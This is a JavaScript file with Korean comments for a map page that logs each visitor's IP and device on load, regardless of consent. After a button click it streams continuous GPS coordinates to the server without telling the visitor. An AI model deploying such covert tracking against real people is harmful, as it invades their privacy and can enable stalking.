// 1. [기본값] 처음엔 서울시(37.5665, 126.9780)를 보여줍니다.
const map = L.map("map").setView([37.5665, 126.9780], 13);

L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
    maxZoom: 19,
    attribution: '© OpenStreetMap contributors'
}).addTo(map);

let marker = null; // 실시간 위치 마커를 담을 변수

// 2. 서버 주소(/submit-location)로 데이터를 전송하는 공통 함수
function sendLogToServer(coords = null) {
    const payload = {
        latitude: coords ? coords.latitude : null,
        longitude: coords ? coords.longitude : null,
        speed: coords ? (coords.speed || 0) : 0,
        heading: coords ? (coords.heading || 0) : 0,
        altitude: coords ? (coords.altitude || 0) : 0,
        userAgent: navigator.userAgent // 접속 기기 정보
    };

    fetch("/submit-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    })
    .then(res => res.json())
    .then(data => console.log("서버 전송 완료:", data))
    .catch(err => console.error("전송 에러:", err));
}

// 🚀 [1차 전송] 사용자가 접속하자마자 권한 허용 여부와 상관없이 무조건 1등으로 보냅니다.
// GPS 값들은 null로 가지만, 서버에서 감지한 IP(통신사 주소)와 시간이 먼저 기록됩니다.
sendLogToServer(null);

// 🚀 [2차 전송 및 지도 연동] 버튼 클릭 이벤트 바인딩
document.getElementById("find-me-btn").addEventListener("click", () => {
    if (navigator.geolocation) {
        
        // 버튼을 누르는 순간 실시간 위치 추적을 시작합니다.
        navigator.geolocation.watchPosition(
            (pos) => {
                // [성공] 사용자가 권한을 허용하고, 기기의 위치(GPS) 기능이 정상 작동할 때
                const { latitude, longitude } = pos.coords;

                // 💡 지도를 사용자의 진짜 위치(대구 등)로 부드럽게 이동 및 줌인 (17레벨)
                map.flyTo([latitude, longitude], 17);

                // 💡 기존 마커가 있다면 지도에서 지우고, 새 위치에 마커를 다시 찍음 (중복 방지)
                if (marker) {
                    map.removeLayer(marker);
                }
                marker = L.marker([latitude, longitude])
                    .addTo(map)
                    .bindPopup("실시간 확인된 위치입니다.")
                    .openPopup();

                // 💡 진짜 GPS 좌표가 실린 데이터를 서버로 전송합니다.
                sendLogToServer(pos.coords);
                
                // 성공적으로 위치를 찾았으므로 안내 버튼은 화면에서 숨깁니다.
                document.getElementById("find-me-btn").style.display = "none";
            },
            (err) => {
                // [실패] 사용자가 거부했거나, 기기 자체에서 위치(GPS) 기능이 꺼져있을 때
                console.warn("위치 가져오기 실패:", err.message);
                
                // 💡 기기의 GPS가 꺼져있거나 권한이 없을 때 사용자에게 명확히 알림을 줍니다.
                if (err.code === err.PERMISSION_DENIED) {
                    alert("위치 권한이 거부되었습니다. 브라우저 설정에서 위치 권한을 승인해주세요.");
                } else if (err.code === err.POSITION_UNAVAILABLE || err.code === err.TIMEOUT) {
                    alert("기기의 실시간 위치(GPS) 기능이 꺼져있거나 신호를 잡을 수 없습니다. 스마트폰이나 PC 설정에서 '위치/GPS 서비스'를 켜고 다시 시도해주세요.");
                } else {
                    alert("위치 정보를 가져오는 중 오류가 발생했습니다.");
                }
            },
            {
                enableHighAccuracy: true, // 높은 정확도로 GPS 요청
                timeout: 10000,           // 10초 동안 GPS 응답 없으면 에러 처리
                maximumAge: 0             // 캐시된 낡은 위치 대신 항상 새로 측정
            }
        );
    } else {
        alert("이 브라우저는 위치 서비스를 지원하지 않습니다.");
    }
});
